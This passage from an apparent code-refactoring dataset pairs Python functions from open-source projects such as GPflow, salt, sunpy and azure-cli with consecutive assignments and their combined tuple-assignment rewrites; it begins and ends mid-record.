            mon = xrandr.XRRGetScreenResources(display, self.drawable).contents

        crtcs = mon.crtcs
        for idx in range(mon.ncrtc):
            crtc = xrandr.XRRGetCrtcInfo(display, mon, crtcs[idx]).contents
            if crtc.noutput == 0:
                xrandr.XRRFreeCrtcInfo(crtc)
                continue

            self._monitors.append(
                {
                    ""left"": int_(crtc.x),
                    ""top"": int_(crtc.y),
                    ""width"": int_(crtc.width),
                    ""height"": int_(crtc.height),
                }
            )
            xrandr.XRRFreeCrtcInfo(crtc)
        xrandr.XRRFreeScreenResources(mon)","display = self._get_display()
int_ = int
xrandr = self.xrandr
gwa = XWindowAttributes()","display , int_ , xrandr , gwa  = self._get_display(), int, self.xrandr, XWindowAttributes()"
GPflow,https://github.com/GPflow/GPflow/tree/master/gpflow/quadrature/gauss_hermite.py,NDiagGHQuadrature,_build_X_W$126,"def _build_X_W(self, mean: TensorType, var: TensorType) -> Tuple[tf.Tensor, tf.Tensor]:
        """"""
        :param mean: Array/Tensor with shape [b1, b2, ..., bX, dim], usually [N, dim],
            representing the mean of a dim-Variate Gaussian distribution
        :param var: Array/Tensor with shape b1, b2, ..., bX, dim], usually [N, dim],
            representing the variance of a dim-Variate Gaussian distribution
        :return: points X, Tensor with shape [n_gh_total, b1, b2, ..., bX, dim],
            usually [n_gh_total, N, dim],
            and weights W, a Tensor with shape [n_gh_total, b1, b2, ..., bX, 1],
            usually [n_gh_total, N, 1]
        """"""

        batch_shape_broadcast = tf.ones(tf.rank(mean) - 1, dtype=tf.int32)
        shape_aux = tf.concat([[self.n_gh_total], batch_shape_broadcast], axis=0)

        # mean, var: [b1, b2, ..., bX, dim], usually [N, dim]
        mean = tf.expand_dims(mean, 0)
        stddev = tf.expand_dims(tf.sqrt(var), 0)
        # mean, stddev: [1, b1, b2, ..., bX, dim], usually [1, N, dim]

        Z = tf.cast(tf.reshape(self.Z, tf.concat([shape_aux, [self.dim]], axis=0)), mean.dtype)
        dZ = tf.cast(tf.reshape(self.dZ, tf.concat([shape_aux, [1]], axis=0)), mean.dtype)

        X = mean + stddev * Z
        W = dZ
        # X: [n_gh_total, b1, b2, ..., bX, dim], usually [n_gh_total, N, dim]
        # W: [n_gh_total,  1,  1, ...,  1,   1], usually [n_gh_total, N,   1]

        return X, W","shape_aux = tf.concat([[self.n_gh_total], batch_shape_broadcast], axis=0)
mean = tf.expand_dims(mean, 0)","shape_aux , mean  = tf.concat([[self.n_gh_total], batch_shape_broadcast], axis=0), tf.expand_dims(mean, 0)"
GPflow,https://github.com/GPflow/GPflow/tree/master/gpflow/quadrature/gauss_hermite.py,NDiagGHQuadrature,_build_X_W$126,"def _build_X_W(self, mean: TensorType, var: TensorType) -> Tuple[tf.Tensor, tf.Tensor]:
        """"""
        :param mean: Array/Tensor with shape [b1, b2, ..., bX, dim], usually [N, dim],
            representing the mean of a dim-Variate Gaussian distribution
        :param var: Array/Tensor with shape b1, b2, ..., bX, dim], usually [N, dim],
            representing the variance of a dim-Variate Gaussian distribution
        :return: points X, Tensor with shape [n_gh_total, b1, b2, ..., bX, dim],
            usually [n_gh_total, N, dim],
            and weights W, a Tensor with shape [n_gh_total, b1, b2, ..., bX, 1],
            usually [n_gh_total, N, 1]
        """"""

        batch_shape_broadcast = tf.ones(tf.rank(mean) - 1, dtype=tf.int32)
        shape_aux = tf.concat([[self.n_gh_total], batch_shape_broadcast], axis=0)

        # mean, var: [b1, b2, ..., bX, dim], usually [N, dim]
        mean = tf.expand_dims(mean, 0)
        stddev = tf.expand_dims(tf.sqrt(var), 0)
        # mean, stddev: [1, b1, b2, ..., bX, dim], usually [1, N, dim]

        Z = tf.cast(tf.reshape(self.Z, tf.concat([shape_aux, [self.dim]], axis=0)), mean.dtype)
        dZ = tf.cast(tf.reshape(self.dZ, tf.concat([shape_aux, [1]], axis=0)), mean.dtype)

        X = mean + stddev * Z
        W = dZ
        # X: [n_gh_total, b1, b2, ..., bX, dim], usually [n_gh_total, N, dim]
        # W: [n_gh_total,  1,  1, ...,  1,   1], usually [n_gh_total, N,   1]

        return X, W","stddev = tf.expand_dims(tf.sqrt(var), 0)
Z = tf.cast(tf.reshape(self.Z, tf.concat([shape_aux, [self.dim]], axis=0)), mean.dtype)","stddev , Z  = tf.expand_dims(tf.sqrt(var), 0), tf.cast(tf.reshape(self.Z, tf.concat([shape_aux, [self.dim]], axis=0)), mean.dtype)"
GPflow,https://github.com/GPflow/GPflow/tree/master/gpflow/quadrature/gauss_hermite.py,NDiagGHQuadrature,_build_X_W$126,"def _build_X_W(self, mean: TensorType, var: TensorType) -> Tuple[tf.Tensor, tf.Tensor]:
        """"""
        :param mean: Array/Tensor with shape [b1, b2, ..., bX, dim], usually [N, dim],
            representing the mean of a dim-Variate Gaussian distribution
        :param var: Array/Tensor with shape b1, b2, ..., bX, dim], usually [N, dim],
            representing the variance of a dim-Variate Gaussian distribution
        :return: points X, Tensor with shape [n_gh_total, b1, b2, ..., bX, dim],
            usually [n_gh_total, N, dim],
            and weights W, a Tensor with shape [n_gh_total, b1, b2, ..., bX, 1],
            usually [n_gh_total, N, 1]
        """"""

        batch_shape_broadcast = tf.ones(tf.rank(mean) - 1, dtype=tf.int32)
        shape_aux = tf.concat([[self.n_gh_total], batch_shape_broadcast], axis=0)

        # mean, var: [b1, b2, ..., bX, dim], usually [N, dim]
        mean = tf.expand_dims(mean, 0)
        stddev = tf.expand_dims(tf.sqrt(var), 0)
        # mean, stddev: [1, b1, b2, ..., bX, dim], usually [1, N, dim]

        Z = tf.cast(tf.reshape(self.Z, tf.concat([shape_aux, [self.dim]], axis=0)), mean.dtype)
        dZ = tf.cast(tf.reshape(self.dZ, tf.concat([shape_aux, [1]], axis=0)), mean.dtype)

        X = mean + stddev * Z
        W = dZ
        # X: [n_gh_total, b1, b2, ..., bX, dim], usually [n_gh_total, N, dim]
        # W: [n_gh_total,  1,  1, ...,  1,   1], usually [n_gh_total, N,   1]

        return X, W","X = mean + stddev * Z
W = dZ","X , W  = mean + stddev * Z, dZ"
cmake-conan,https://github.com/conan-io/cmake-conan/tree/master//tests.py,CMakeConanTest,test_conan_cmake_configure$117,"def test_conan_cmake_configure(self):
        content = textwrap.dedent(""""""
            cmake_minimum_required(VERSION 2.8)
            project(FormatOutput CXX)
            include(conan.cmake)
            conan_cmake_configure(REQUIRES poco/1.9.4 zlib/1.2.11
                                  BUILD_REQUIRES 7zip/16.00
                                  GENERATORS xcode cmake qmake
                                  OPTIONS poco:shared=True openssl:shared=True
                                  IMPORTS ""bin, *.dll -> ./bin""
                                  IMPORTS ""lib, *.dylib* -> ./bin"")
        """""")
        result_conanfile = textwrap.dedent(""""""
            [requires]
            poco/1.9.4
            zlib/1.2.11
            [generators]
            xcode
            cmake
            qmake
            [build_requires]
            7zip/16.00
            [imports]
            bin, *.dll -> ./bin
            lib, *.dylib* -> ./bin
            [options]
            poco:shared=True
            openssl:shared=True
        """""")
        save(""CMakeLists.txt"", content)
        os.makedirs(""build"")
        os.chdir(""build"")
        run(""cmake .. {} -DCMAKE_BUILD_TYPE=Release"".format(generator))
        with open('conanfile.txt', 'r') as file:
            data = file.read()
            assert data in result_conanfile","content = textwrap.dedent('\n            cmake_minimum_required(VERSION 2.8)\n            project(FormatOutput CXX)\n            include(conan.cmake)\n            conan_cmake_configure(REQUIRES poco/1.9.4 zlib/1.2.11\n                                  BUILD_REQUIRES 7zip/16.00\n                                  GENERATORS xcode cmake qmake\n                                  OPTIONS poco:shared=True openssl:shared=True\n                                  IMPORTS ""bin, *.dll -> ./bin""\n                                  IMPORTS ""lib, *.dylib* -> ./bin"")\n        ')
result_conanfile = textwrap.dedent('\n            [requires]\n            poco/1.9.4\n            zlib/1.2.11\n            [generators]\n            xcode\n            cmake\n            qmake\n            [build_requires]\n            7zip/16.00\n            [imports]\n            bin, *.dll -> ./bin\n            lib, *.dylib* -> ./bin\n            [options]\n            poco:shared=True\n            openssl:shared=True\n        ')","content , result_conanfile  = textwrap.dedent('\n            cmake_minimum_required(VERSION 2.8)\n            project(FormatOutput CXX)\n            include(conan.cmake)\n            conan_cmake_configure(REQUIRES poco/1.9.4 zlib/1.2.11\n                                  BUILD_REQUIRES 7zip/16.00\n                                  GENERATORS xcode cmake qmake\n                                  OPTIONS poco:shared=True openssl:shared=True\n                                  IMPORTS ""bin, *.dll -> ./bin""\n                                  IMPORTS ""lib, *.dylib* -> ./bin"")\n        '), textwrap.dedent('\n            [requires]\n            poco/1.9.4\n            zlib/1.2.11\n            [generators]\n            xcode\n            cmake\n            qmake\n            [build_requires]\n            7zip/16.00\n            [imports]\n            bin, *.dll -> ./bin\n            lib, *.dylib* -> ./bin\n            [options]\n            poco:shared=True\n            openssl:shared=True\n        ')"
multiview-human-pose-estimation-pytorch,https://github.com/microsoft/multiview-human-pose-estimation-pytorch/tree/master/lib/models/pose_hrnet.py,HighResolutionModule,_make_fuse_layers$192,"def _make_fuse_layers(self):
        if self.num_branches == 1:
            return None

        num_branches = self.num_branches
        num_inchannels = self.num_inchannels
        fuse_layers = []
        for i in range(num_branches if self.multi_scale_output else 1):
            fuse_layer = []
            for j in range(num_branches):
                if j > i:
                    fuse_layer.append(
                        nn.Sequential(
                            nn.Conv2d(
                                num_inchannels[j],
                                num_inchannels[i],
                                1,
                                1,
                                0,
                                bias=False), nn.BatchNorm2d(num_inchannels[i]),
                            nn.Upsample(
                                scale_factor=2**(j - i), mode='nearest')))
                elif j == i:
                    fuse_layer.append(None)
                else:
                    conv3x3s = []
                    for k in range(i - j):
                        if k == i - j - 1:
                            num_outchannels_conv3x3 = num_inchannels[i]
                            conv3x3s.append(
                                nn.Sequential(
                                    nn.Conv2d(
                                        num_inchannels[j],
                                        num_outchannels_conv3x3,
                                        3,
                                        2,
                                        1,
                                        bias=False),
                                    nn.BatchNorm2d(num_outchannels_conv3x3)))
                        else:
                            num_outchannels_conv3x3 = num_inchannels[j]
                            conv3x3s.append(
                                nn.Sequential(
                                    nn.Conv2d(
                                        num_inchannels[j],
                                        num_outchannels_conv3x3,
                                        3,
                                        2,
                                        1,
                                        bias=False),
                                    nn.BatchNorm2d(num_outchannels_conv3x3),
                                    nn.ReLU(True)))
                    fuse_layer.append(nn.Sequential(*conv3x3s))
            fuse_layers.append(nn.ModuleList(fuse_layer))

        return nn.ModuleList(fuse_layers)","num_branches = self.num_branches
num_inchannels = self.num_inchannels
fuse_layers = []","num_branches , num_inchannels , fuse_layers  = self.num_branches, self.num_inchannels, []"
mongoengine,https://github.com/MongoEngine/mongoengine/tree/master/tests/test_datastructures.py,TestBaseDict,test___init___$36,"def test___init___(self):
        class MyDoc(Document):
            pass

        dict_items = {""k"": ""v""}
        doc = MyDoc()
        base_dict = BaseDict(dict_items, instance=doc, name=""my_name"")
        assert isinstance(base_dict._instance, Document)
        assert base_dict._name == ""my_name""
        assert base_dict == dict_items","dict_items = {'k': 'v'}
doc = MyDoc()","dict_items , doc  = {'k': 'v'}, MyDoc()"
deep-motion-editing,https://github.com/DeepMotionEditing/deep-motion-editing/tree/master/style_transfer/data_proc/export_train.py,,divide_clip_xia$47,"def divide_clip_xia(input, window, window_step, divide):
    if not divide:  # return the whole clip
        t = ((input.shape[0]) // 4) * 4 + 4
        t = max(t, 12)
        if len(input) < t:
            input = pad_to_window(input, t)
        return [input]

    windows = []
    j = -(window // 4)
    total = len(input)
    while True:
        slice = input[max(j, 0): j + window].copy()  # remember to COPY!!
        if len(slice) < window:
            slice = pad_to_window(slice, window)
        windows.append(slice)
        j += window_step
        if total - j < (3 * window) // 4:
            break
    return windows","windows = []
j = -(window // 4)
total = len(input)","windows , j , total  = [], -(window // 4), len(input)"
MinkowskiEngine,https://github.com/NVIDIA/MinkowskiEngine/tree/master/tests/python/interpolation.py,TestInterpolation,test$42,"def test(self):
        in_channels, D = 2, 2
        coords, feats, labels = data_loader(in_channels, batch_size=2)
        feats = feats.double()
        tfield = torch.Tensor(
            [
                [0, 0.1, 2.7],
                [0, 0.3, 2],
                [1, 1.5, 2.5],
            ]
        ).double()
        feats.requires_grad_()
        input = SparseTensor(feats, coordinates=coords)
        interp = MinkowskiInterpolation(return_kernel_map=True, return_weights=False)
        output, (in_map, out_map) = interp(input, tfield)
        print(input)
        print(output)

        # Check backward
        output.sum().backward()
        fn = MinkowskiInterpolationFunction()
        self.assertTrue(
            gradcheck(
                fn,
                (
                    input.F,
                    tfield,
                    input.coordinate_map_key,
                    input._manager,
                ),
            )
        )

        for i in range(LEAK_TEST_ITER):
            input = SparseTensor(feats, coordinates=coords)
            tfield = torch.DoubleTensor(
                [
                    [0, 0.1, 2.7],
                    [0, 0.3, 2],
                    [1, 1.5, 2.5],
                ],
            )
            output, _ = interp(input, tfield)
            output.sum().backward()","feats = feats.double()
tfield = torch.Tensor([[0, 0.1, 2.7], [0, 0.3, 2], [1, 1.5, 2.5]]).double()","feats , tfield  = feats.double(), torch.Tensor([[0, 0.1, 2.7], [0, 0.3, 2], [1, 1.5, 2.5]]).double()"
MinkowskiEngine,https://github.com/NVIDIA/MinkowskiEngine/tree/master/tests/python/interpolation.py,TestInterpolation,test$42,"def test(self):
        in_channels, D = 2, 2
        coords, feats, labels = data_loader(in_channels, batch_size=2)
        feats = feats.double()
        tfield = torch.Tensor(
            [
                [0, 0.1, 2.7],
                [0, 0.3, 2],
                [1, 1.5, 2.5],
            ]
        ).double()
        feats.requires_grad_()
        input = SparseTensor(feats, coordinates=coords)
        interp = MinkowskiInterpolation(return_kernel_map=True, return_weights=False)
        output, (in_map, out_map) = interp(input, tfield)
        print(input)
        print(output)

        # Check backward
        output.sum().backward()
        fn = MinkowskiInterpolationFunction()
        self.assertTrue(
            gradcheck(
                fn,
                (
                    input.F,
                    tfield,
                    input.coordinate_map_key,
                    input._manager,
                ),
            )
        )

        for i in range(LEAK_TEST_ITER):
            input = SparseTensor(feats, coordinates=coords)
            tfield = torch.DoubleTensor(
                [
                    [0, 0.1, 2.7],
                    [0, 0.3, 2],
                    [1, 1.5, 2.5],
                ],
            )
            output, _ = interp(input, tfield)
            output.sum().backward()","input = SparseTensor(feats, coordinates=coords)
interp = MinkowskiInterpolation(return_kernel_map=True, return_weights=False)","input , interp  = SparseTensor(feats, coordinates=coords), MinkowskiInterpolation(return_kernel_map=True, return_weights=False)"
MinkowskiEngine,https://github.com/NVIDIA/MinkowskiEngine/tree/master/tests/python/interpolation.py,TestInterpolation,test$42,"def test(self):
        in_channels, D = 2, 2
        coords, feats, labels = data_loader(in_channels, batch_size=2)
        feats = feats.double()
        tfield = torch.Tensor(
            [
                [0, 0.1, 2.7],
                [0, 0.3, 2],
                [1, 1.5, 2.5],
            ]
        ).double()
        feats.requires_grad_()
        input = SparseTensor(feats, coordinates=coords)
        interp = MinkowskiInterpolation(return_kernel_map=True, return_weights=False)
        output, (in_map, out_map) = interp(input, tfield)
        print(input)
        print(output)

        # Check backward
        output.sum().backward()
        fn = MinkowskiInterpolationFunction()
        self.assertTrue(
            gradcheck(
                fn,
                (
                    input.F,
                    tfield,
                    input.coordinate_map_key,
                    input._manager,
                ),
            )
        )

        for i in range(LEAK_TEST_ITER):
            input = SparseTensor(feats, coordinates=coords)
            tfield = torch.DoubleTensor(
                [
                    [0, 0.1, 2.7],
                    [0, 0.3, 2],
                    [1, 1.5, 2.5],
                ],
            )
            output, _ = interp(input, tfield)
            output.sum().backward()","input = SparseTensor(feats, coordinates=coords)
tfield = torch.DoubleTensor([[0, 0.1, 2.7], [0, 0.3, 2], [1, 1.5, 2.5]])","input , tfield  = SparseTensor(feats, coordinates=coords), torch.DoubleTensor([[0, 0.1, 2.7], [0, 0.3, 2], [1, 1.5, 2.5]])"
salt,https://github.com/saltstack/salt/tree/master/salt/returners/postgres_local_cache.py,,save_load$274,"def save_load(jid, clear_load, minions=None):
    """"""
    Save the load to the specified jid id
    """"""
    jid = _escape_jid(jid)
    conn = _get_conn()
    if conn is None:
        return None
    cur = conn.cursor()
    sql = (
        """"""INSERT INTO jids """"""
        """"""(jid, started, tgt_type, cmd, tgt, kwargs, ret, username, arg,""""""
        """""" fun) """"""
        """"""VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s)""""""
    )

    cur.execute(
        sql,
        (
            jid,
            salt.utils.jid.jid_to_time(jid),
            str(clear_load.get(""tgt_type"")),
            str(clear_load.get(""cmd"")),
            str(clear_load.get(""tgt"")),
            str(clear_load.get(""kwargs"")),
            str(clear_load.get(""ret"")),
            str(clear_load.get(""user"")),
            str(salt.utils.json.dumps(clear_load.get(""arg""))),
            str(clear_load.get(""fun"")),
        ),
    )
    # TODO: Add Metadata support when it is merged from develop
    _close_conn(conn)","jid = _escape_jid(jid)
conn = _get_conn()","jid , conn  = _escape_jid(jid), _get_conn()"
salt,https://github.com/saltstack/salt/tree/master/salt/returners/postgres_local_cache.py,,save_load$274,"def save_load(jid, clear_load, minions=None):
    """"""
    Save the load to the specified jid id
    """"""
    jid = _escape_jid(jid)
    conn = _get_conn()
    if conn is None:
        return None
    cur = conn.cursor()
    sql = (
        """"""INSERT INTO jids """"""
        """"""(jid, started, tgt_type, cmd, tgt, kwargs, ret, username, arg,""""""
        """""" fun) """"""
        """"""VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s)""""""
    )

    cur.execute(
        sql,
        (
            jid,
            salt.utils.jid.jid_to_time(jid),
            str(clear_load.get(""tgt_type"")),
            str(clear_load.get(""cmd"")),
            str(clear_load.get(""tgt"")),
            str(clear_load.get(""kwargs"")),
            str(clear_load.get(""ret"")),
            str(clear_load.get(""user"")),
            str(salt.utils.json.dumps(clear_load.get(""arg""))),
            str(clear_load.get(""fun"")),
        ),
    )
    # TODO: Add Metadata support when it is merged from develop
    _close_conn(conn)","cur = conn.cursor()
sql = 'INSERT INTO jids (jid, started, tgt_type, cmd, tgt, kwargs, ret, username, arg, fun) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s)'","cur , sql  = conn.cursor(), 'INSERT INTO jids (jid, started, tgt_type, cmd, tgt, kwargs, ret, username, arg, fun) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s)'"
SublimeJEDI,https://github.com/srusskih/SublimeJEDI/tree/master/dependencies/parso/python/diff.py,_NodesTree,__init__$593,"def __init__(self, module):
        self._base_node = _NodesTreeNode(module)
        self._working_stack = [self._base_node]
        self._module = module
        self._prefix_remainder = ''
        self.prefix = ''
        self.indents = [0]","self._working_stack = [self._base_node]
self._module = module
self._prefix_remainder = ''
self.prefix = ''
self.indents = [0]","self._working_stack , self._module , self._prefix_remainder , self.prefix , self.indents  = [self._base_node], module, '', '', [0]"
katana,https://github.com/JohnHammond/katana/tree/master/katana/units/tar/extract.py,Unit,evaluate$48,"def evaluate(self, case: str):
        """"""
        Evaluate the target. Extract the target with TAR and
        recurse on any new found files.

        :param case: A case returned by ``enumerate``. For this unit,\
        the ``enumerate`` function is not used.

        :return: None. This function should not return any data.
        """"""

        # Retrieve the directory to store these in
        tar_directory = self.get_output_dir()

        # Open the tar file for reading
        tar = tarfile.open(self.target.path)

        # Extract all the files and recurse on them!
        for tarinfo in tar:
            tar.extract(tarinfo.name, path=tar_directory)
            abs_path = os.path.join(tar_directory, tarinfo.name)
            self.manager.register_artifact(self, abs_path)","tar_directory = self.get_output_dir()
tar = tarfile.open(self.target.path)","tar_directory , tar  = self.get_output_dir(), tarfile.open(self.target.path)"
graphics,https://github.com/tensorflow/graphics/tree/master/tensorflow_graphics/rendering/tests/rasterization_test_utils.py,,make_perspective_matrix$27,"def make_perspective_matrix(image_width=None, image_height=None):
  """"""Generates perspective matrix for a given image size.

  Args:
    image_width: int representing image width.
    image_height: int representing image height.

  Returns:
    Perspective matrix, tensor of shape [4, 4].

  Note: Golden tests require image size to be fixed and equal to the size of
  golden image examples. The rest of the camera parameters are set such that
  resulting image will be equal to the baseline image.
  """"""

  field_of_view = (40 * np.math.pi / 180,)
  near_plane = (0.01,)
  far_plane = (10.0,)
  return perspective.right_handed(field_of_view,
                                  (float(image_width) / float(image_height),),
                                  near_plane, far_plane)","field_of_view = (40 * np.math.pi / 180,)
near_plane = (0.01,)
far_plane = (10.0,)","field_of_view , near_plane , far_plane  = (40 * np.math.pi / 180,), (0.01,), (10.0,)"
dulwich,https://github.com/dulwich/dulwich/tree/master/dulwich/tests/test_pack.py,TestPackIndexWritingv1,setUp$762,"def setUp(self):
        TestCase.setUp(self)
        BaseTestFilePackIndexWriting.setUp(self)
        self._has_crc32_checksum = False
        self._expected_version = 1
        self._supports_large = False
        self._write_fn = write_pack_index_v1","self._has_crc32_checksum = False
self._expected_version = 1
self._supports_large = False
self._write_fn = write_pack_index_v1","self._has_crc32_checksum , self._expected_version , self._supports_large , self._write_fn  = False, 1, False, write_pack_index_v1"
gluon-ts,https://github.com/awslabs/gluon-ts/tree/master/src/gluonts/itertools.py,IterableSlice,__init__$136,"def __init__(self, iterable: Iterable, length: Optional[int]) -> None:
        self.iterable = iterable
        self.length = length","self.iterable = iterable
self.length = length","self.iterable , self.length  = iterable, length"
flask-restx,https://github.com/python-restx/flask-restx/tree/master/flask_restx/mask.py,Mask,parse$45,"def parse(self, mask):
        """"""
        Parse a fields mask.
        Expect something in the form::

            {field,nested{nested_field,another},last}

        External brackets are optionals so it can also be written::

            field,nested{nested_field,another},last

        All extras characters will be ignored.

        :param str mask: the mask string to parse
        :raises ParseError: when a mask is unparseable/invalid

        """"""
        if not mask:
            return

        mask = self.clean(mask)
        fields = self
        previous = None
        stack = []

        for token in LEXER.findall(mask):
            if token == ""{"":
                if previous not in fields:
                    raise ParseError(""Unexpected opening bracket"")
                fields[previous] = Mask(skip=self.skip)
                stack.append(fields)
                fields = fields[previous]
            elif token == ""}"":
                if not stack:
                    raise ParseError(""Unexpected closing bracket"")
                fields = stack.pop()
            elif token == "","":
                if previous in ("","", ""{"", None):
                    raise ParseError(""Unexpected comma"")
            else:
                fields[token] = True

            previous = token

        if stack:
            raise ParseError(""Missing closing bracket"")","mask = self.clean(mask)
fields = self
previous = None
stack = []","mask , fields , previous , stack  = self.clean(mask), self, None, []"
azure-cli,https://github.com/Azure/azure-cli/tree/master/src/azure-cli/azure/cli/command_modules/serviceconnector/tests/latest/test_webpp_connection_scenario.py,WebAppConnectionScenarioTest,test_webapp_storagefile_e2e$1233,"def test_webapp_storagefile_e2e(self):
        self.kwargs.update({
            'subscription': get_subscription_id(self.cli_ctx),
            'source_resource_group': 'servicelinker-test-linux-group',
            'target_resource_group': 'servicelinker-test-linux-group',
            'site': 'servicelinker-storagefile-app',
            'account': 'servicelinkerstorage'
        })

        # prepare params
        name = 'testconn'
        source_id = SOURCE_RESOURCES.get(RESOURCE.WebApp).format(**self.kwargs)
        target_id = TARGET_RESOURCES.get(RESOURCE.StorageFile).format(**self.kwargs)

        # create connection
        self.cmd('webapp connection create storage-file --connection {} --source-id {} --target-id {} '
                 '--secret --client-type python'.format(name, source_id, target_id))

        # list connection
        connections = self.cmd(
            'webapp connection list --source-id {}'.format(source_id),
            checks = [
                self.check('length(@)', 1),
                self.check('[0].authInfo.authType', 'secret'),
                self.check('[0].clientType', 'python')
            ]
        ).get_output_in_json()
        connection_id = connections[0].get('id')

        # update connection
        self.cmd('webapp connection update storage-file --id {} --client-type dotnet'.format(connection_id),
                 checks = [ self.check('clientType', 'dotnet') ])

        # list configuration
        self.cmd('webapp connection list-configuration --id {}'.format(connection_id))

        # validate connection
        self.cmd('webapp connection validate --id {}'.format(connection_id))

        # show connection
        self.cmd('webapp connection show --id {}'.format(connection_id))

        # delete connection
        self.cmd('webapp connection delete --id {} --yes'.format(connection_id))","name = 'testconn'
source_id = SOURCE_RESOURCES.get(RESOURCE.WebApp).format(**self.kwargs)
target_id = TARGET_RESOURCES.get(RESOURCE.StorageFile).format(**self.kwargs)","name , source_id , target_id  = 'testconn', SOURCE_RESOURCES.get(RESOURCE.WebApp).format(**self.kwargs), TARGET_RESOURCES.get(RESOURCE.StorageFile).format(**self.kwargs)"
datashader,https://github.com/holoviz/datashader/tree/master/datashader/glyphs/area.py,AreaToLineAxis1YConstant,compute_y_bounds$849,"def compute_y_bounds(self, *args):
        y_min = min(np.nanmin(self.y), np.nanmin(self.y_stack))
        y_max = max(np.nanmax(self.y), np.nanmax(self.y_stack))
        return self.maybe_expand_bounds((y_min, y_max))","y_min = min(np.nanmin(self.y), np.nanmin(self.y_stack))
y_max = max(np.nanmax(self.y), np.nanmax(self.y_stack))","y_min , y_max  = min(np.nanmin(self.y), np.nanmin(self.y_stack)), max(np.nanmax(self.y), np.nanmax(self.y_stack))"
sunpy,https://github.com/sunpy/sunpy/tree/master/sunpy/net/scraper.py,Scraper,_extract_files_meta$423,"def _extract_files_meta(self, timerange, extractor, matcher=None):
        """"""
        Returns metadata information contained in URLs.

        Parameters
        ----------
        timerange : `~sunpy.time.TimeRange`
            Time interval where to find the directories for a given pattern.
        extractor : `str`
            Pattern to extract metadata by parsing the URL.
        matcher : `dict`
            Dictionary to check if extracted metadata is valid.

        Returns
        -------
        `list` of `dict`
            List of metadata info for all URLs.
        """"""
        self.extractor = extractor
        urls = self.filelist(timerange)
        metalist = []
        for url in urls:
            metadict = parse(extractor, url)
            if metadict is not None:
                append = True
                metadict = metadict.named
                metadict['url'] = url
                if matcher is not None:
                    for k in metadict:
                        if k in matcher and str(metadict[k]) not in matcher[k]:
                            append = False
                            break
                if append:
                    metalist.append(metadict)
        return metalist","urls = self.filelist(timerange)
metalist = []","urls , metalist  = self.filelist(timerange), []"
sunpy,https://github.com/sunpy/sunpy/tree/master/sunpy/net/scraper.py,Scraper,_extract_files_meta$423,"def _extract_files_meta(self, timerange, extractor, matcher=None):
        """"""
        Returns metadata information contained in URLs.

        Parameters
        ----------
        timerange : `~sunpy.time.TimeRange`
            Time interval where to find the directories for a given pattern.
        extractor : `str`
            Pattern to extract metadata by parsing the URL.
        matcher : `dict`
            Dictionary to check if extracted metadata is valid.

        Returns
        -------
        `list` of `dict`
            List of metadata info for all URLs.
        """"""
        self.extractor = extractor
        urls = self.filelist(timerange)
        metalist = []
        for url in urls:
            metadict = parse(extractor, url)
            if metadict is not None:
                append = True
                metadict = metadict.named
                metadict['url'] = url
                if matcher is not None:
                    for k in metadict:
                        if k in matcher and str(metadict[k]) not in matcher[k]:
                            append = False
                            break
                if append:
                    metalist.append(metadict)
        return metalist","append = True
metadict = metadict.named","append , metadict  = True, metadict.named"
wukong-robot,https://github.com/wzpan/wukong-robot/tree/master/tools/solr_tools.py,,delete_engine$70,"def delete_engine(host, enginename, port=8983):
    """"""
    Delete engine
    """"""
    url = ""http://{}:{}/solr/admin/collections"".format(host, port)
    params = {}
    params[""action""] = ""DELETE""
    params[""name""] = enginename
    params[""wt""] = ""json""
    try:
        req = urllib.request.Request(url)
        response = urllib.request.urlopen(
            req, urllib.parse.urlencode(params).encode(""utf-8"")
        )
        print(response.read())
    except Exception as err:
        _get_error_message(err)","url = 'http://{}:{}/solr/admin/collections'.format(host, port)
params = {}","url , params  = 'http://{}:{}/solr/admin/collections'.format(host, port), {}"
wukong-robot,https://github.com/wzpan/wukong-robot/tree/master/tools/solr_tools.py,,delete_engine$70,"def delete_engine(host, enginename, port=8983):
    """"""
    Delete engine
    """"""
    url = ""http://{}:{}/solr/admin/collections"".format(host, port)
    params = {}
    params[""action""] = ""DELETE""
    params[""name""] = enginename
    params[""wt""] = ""json""
    try:
        req = urllib.request.Request(url)
        response = urllib.request.urlopen(
            req, urllib.parse.urlencode(params).encode(""utf-8"")
        )
        print(response.read())
    except Exception as err:
        _get_error_message(err)","params['action'] = 'DELETE'
params['name'] = enginename
params['wt'] = 'json'","params['action'] , params['name'] , params['wt']  = 'DELETE', enginename, 'json'"
sdc,https://github.com/IntelPython/sdc/tree/master/sdc/tests/test_dataframe.py,TestDataFrame,test_df_reset_index_drop$1723,"def test_df_reset_index_drop(self):
        def test_impl(df, drop):
            return df.reset_index(drop=drop)

        df = pd.DataFrame({'A': [1.0, 2.0, np.nan, 1.0], 'B': np.arange(4.0)})
        hpat_func = self.jit(test_impl)

        for drop in [True, False]:
            with self.subTest(drop=drop):
                with self.assertRaises(Exception) as raises:
                    hpat_func(df, drop)
                msg = 'drop is only supported as a literal'
                self.assertIn(msg, str(raises.exception))","df = pd.DataFrame({'A': [1.0, 2.0, np.nan, 1.0], 'B': np.arange(4.0)})
hpat_func = self.jit(test_impl)","df , hpat_func  = pd.DataFrame({'A': [1.0, 2.0, np.nan, 1.0], 'B': np.arange(4.0)}), self.jit(test_impl)"
mesh,https://github.com/tensorflow/mesh/tree/master/mesh_tensorflow/bert/run_squad.py,FeatureWriter,process_feature$1147,"def process_feature(self, feature):
    """"""Write a InputFeature to the TFRecordWriter as a tf.train.Example.""""""
    self.num_features += 1

    def create_int_feature(values):
      feature = tf.train.Feature(
          int64_list=tf.train.Int64List(value=list(values)))
      return feature

    features = collections.OrderedDict()
    features[""unique_ids""] = create_int_feature([feature.unique_id])
    features[""input_ids""] = create_int_feature(feature.input_ids)
    features[""input_mask""] = create_int_feature(feature.input_mask)
    features[""segment_ids""] = create_int_feature(feature.segment_ids)

    if self.is_training:
      features[""start_positions""] = create_int_feature([feature.start_position])
      features[""end_positions""] = create_int_feature([feature.end_position])
      impossible = 0
      if feature.is_impossible:
        impossible = 1
      features[""is_impossible""] = create_int_feature([impossible])

    tf_example = tf.train.Example(features=tf.train.Features(feature=features))
    self._writer.write(tf_example.SerializeToString())","features['unique_ids'] = create_int_feature([feature.unique_id])
features['input_ids'] = create_int_feature(feature.input_ids)
features['input_mask'] = create_int_feature(feature.input_mask)
